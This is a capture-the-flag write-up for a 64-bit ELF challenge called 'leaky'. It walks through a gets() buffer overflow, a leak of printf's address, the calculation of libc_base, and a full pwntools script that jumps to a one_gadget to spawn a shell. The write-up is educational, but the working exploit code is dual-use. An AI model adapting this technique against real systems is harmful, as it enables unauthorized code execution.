# leaky - Pwn challenge
We can see with `$ file` that the binary is a 64-bit ELF. We go straight up in `ghidra` to analyze it.  
`main` function looks like this:
```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  welcome();
  vuln();
  goodbye();
  return 0;
}
```

Pretty straight forward, we head into `vuln`. 
```c
void vuln(void)

{
  int iVar1;
  char local_18 [8];
  char local_10 [8];
  
  puts("If you give me a cookie, I will give you a present :)");
  gets(local_10);
  iVar1 = strncmp(local_10,s,8);
  if (iVar1 == 0) {
    printf("Thanks a lot for the cookie <(^_^)> !! Here is a present for you: %p\n",printf);
    puts("Do you like my present??\n");
    gets(local_18);
  }
  return;
}
```
We can see a **Buffer overflow** via `gets`. Also, there is a leak if we pass the comparison and we can get the address of `printf`. 
This is very important and useful because from that we can calculate **libc_base**. 
As we can see, it compares our input that is stored in `local_10` with `s`which is the const: `a cookie`.  
After we pass that and get our leak, we calculate libc_base.  
```
libc_base = leaked_printf - libc_printf
```
Then we use `one_gadget` to get shell. In order to get shell, we need the proper libc. This is for my local machine. 
```python
#!/usr/bin/python3  
from pwn import *

ip = 'ctf.uniwa.gr' # change this
port = 2005 # change this
filename = './leaky' # change this

_libc = '/lib/x86_64-linux-gnu/libc.so.6' # change this

og = [0xcb79a, 0xcb79d, 0xcb7a0, 0xe926b] 

def pwn():
    #r = remote(ip, port)
    r = process(filename)
    e = ELF(filename)
    libc = ELF(_libc)
    
    ### Calculate the addresses ###
    printf_libc = libc.symbols['printf']
    main = p64(e.symbols['main'])
    junk = b'z'*24
    
    ### Stage 1: leaking ###
    payload = 'a cookie'
    r.sendlineafter('a present :)', payload)
    r.recvuntil(':')
    leaked = r.recvline()
    leaked = int(leaked, 16)
    log.success('Leaked printf: ' + hex(leaked))

    ### Stage 2: Calculate libc_base and offsets ###
    base = leaked - printf_libc

    ### Stage 3: craft payload and get shell ###
    payload = junk + p64(base + og[0])
    r.sendlineafter('present??', payload)
    log.success('SHELL OBTAINED SUCCESSFULLY!\n')
    r.interactive()

pwn()
```
